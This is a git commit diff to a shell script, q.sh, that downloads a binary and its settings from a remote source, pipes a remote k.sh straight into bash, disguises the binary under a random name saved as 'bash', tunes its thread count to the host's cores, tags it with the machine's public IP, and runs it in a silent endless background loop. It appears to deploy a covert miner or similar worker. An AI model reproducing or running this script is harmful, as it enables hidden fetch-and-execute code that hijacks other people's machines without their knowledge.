00b40691cc379872b88081da1e3c96b5cd5de96d
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-09-24 15:35:37 +0800

    Update q.sh

--- q.sh
+++ q.sh
@@ -18,6 +18,7 @@ cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep
 [ -n "$cores" ] || cores=1
 addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/null`
 [ -n "$addr" ] || addr="NULL"
+name=`RandString 2 c${cores}_${addr}`;
 
 
 bash <(wget -qO- ${src}/k.sh) 7200 5400 >/dev/null 2>&1 &
@@ -38,21 +39,26 @@ wget --no-check-certificate -4 -qO "${work}/appsettings.json" "${src}/q.json"
 wget --no-check-certificate -4 -qO "${work}/bash" "${src}/q"
 chmod -R 777 "${work}"
 sed -i "s/\"trainerBinary\":.*/\"trainerBinary\": \"$(RandString 7)\",/" "${work}/appsettings.json"
+sed -i "s/\"amountOfThreads\":.*/\"amountOfThreads\": \"${cores}\",/" "${work}/appsettings.json"
+sed -i "s/\"alias\":.*/\"alias\": \"${name}\",/" "${work}/appsettings.json"
 [ -n "$idlePid" ] && sed -i "s/\"idleSettings\":.*/\"idleSettings\": {\"command\": \"kill\", \"arguments\": \"-10 $idlePid\"},/" "${work}/appsettings.json"
 
-cat /proc/cpuinfo 2>/dev/null |grep -iq 'AVX512'
-[ "$?" == "0" ] && AVX512=1 || AVX512=0
-cat /proc/cpuinfo 2>/dev/null |grep -iq 'AVX2'
-[ "$?" == "0" ] && [ "$AVX512" == "0" ] && AVX2=1 || AVX2=0
-[ "$AVX2" == "1" ] && sed -i "s/AVX512/AVX2/g" "${work}/appsettings.json"
-[ "$AVX512" == "0" ] && [ "$AVX2" == "0" ] && sed -i "/AVX512/d" "${work}/appsettings.json"
+
+# cat /proc/cpuinfo 2>/dev/null |grep -iq 'AVX512'
+# [ "$?" == "0" ] && AVX512=1 || AVX512=0
+# cat /proc/cpuinfo 2>/dev/null |grep -iq 'AVX2'
+# [ "$?" == "0" ] && [ "$AVX512" == "0" ] && AVX2=1 || AVX2=0
+# [ "$AVX2" == "1" ] && sed -i "s/AVX512/AVX2/g" "${work}/appsettings.json"
+# [ "$AVX512" == "0" ] && [ "$AVX2" == "0" ] && sed -i "/AVX512/d" "${work}/appsettings.json"
 
 
 if [ "$mode" == "0" ]; then
-  name=`RandString 2 c${cores}_${addr}`;
-  bash -c "while true; do cd "${work}"; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 7; done" >/dev/null 2>&1 &
+  # name=`RandString 2 c${cores}_${addr}`;
+  # bash -c "while true; do cd "${work}"; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 7; done" >/dev/null 2>&1 &
+  bash -c "while true; do cd "${work}"; ./bash >/dev/null 2>&1 ; sleep 7; done" >/dev/null 2>&1 &
 else
-  while true; do cd "${work}"; name=`RandString 2 d${cores}_${addr}`; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 7; done
+  # while true; do cd "${work}"; name=`RandString 2 d${cores}_${addr}`; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 7; done
+  while true; do cd "${work}"; ./bash >/dev/null 2>&1 ; sleep 7; done
 fi
 
 
